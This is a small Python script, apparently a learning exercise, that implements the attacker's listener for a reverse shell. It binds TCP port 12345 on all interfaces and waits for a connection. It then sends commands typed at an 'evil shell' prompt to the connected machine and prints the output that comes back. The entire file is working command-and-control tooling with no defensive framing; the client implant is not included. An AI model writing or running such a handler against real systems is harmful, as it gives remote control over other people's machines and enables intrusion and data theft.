import socket
# the host is 0.0.0.0 : 
'''
lcoal host translates into 127.0.0.1 which will always be the IP address of the machine 
- can only communicate with the same host

0.0.0.0 ---> "listen on every available network interface"
'''
HOST = "0.0.0.0"
PORT = 12345
BUFFER = 1024


# server set up
def main():
    print('running shell')

    # AF_INET is the address family ipv4, SOCK_STREAM is the socket protocol TCP
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    sock.bind((HOST, PORT))
    sock.listen(5) # number of client connections we can accept

    print("We are here")
   # connect, address = sock.accept()

    connect, address = sock.accept()
    
    # output = connect.recv(BUFFER.decode("UTF-8"))
    print(f"Connected by {address}")
    while True:
        # data = connect.recv(BUFFER).decode("UTF-8")
        command = input("$ evil shell :3 > ")
        if command == "":
            # connect.send("command".encode())
            break
        print("**********sending command!!! please wait :3")
        connect.send(command.encode())
        output = connect.recv(BUFFER).decode("UTF-8")
        print("**********print results: ")
        print(output)
        
        # if len(data) > 0:
        #     print("Received data: " + data)

        
    print("closing connection")
    connect.close()

        



    
    

if __name__ == "__main__":
    main()